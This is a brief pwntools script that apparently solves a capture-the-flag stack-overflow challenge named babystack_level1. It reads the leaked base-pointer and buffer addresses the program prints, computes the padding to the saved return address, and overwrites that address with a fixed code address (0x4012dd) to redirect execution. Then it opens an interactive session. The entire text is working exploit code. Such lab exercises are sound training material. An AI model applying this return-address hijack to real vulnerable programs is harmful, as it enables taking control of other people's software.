from pwn import *

r = process("/challenge/babystack_level1")
r.recvuntil(b"base pointer rbp: ")
bp = int(r.recvline(keepends=False), 16)
r.recvuntil(b"will be stored: ")
buf = int(r.recvline(keepends=False), 16)
padding = bp-buf+8
payload = b'a'*padding + p64(0x4012dd)
# print(padding)
r.sendline(payload)
r.interactive()

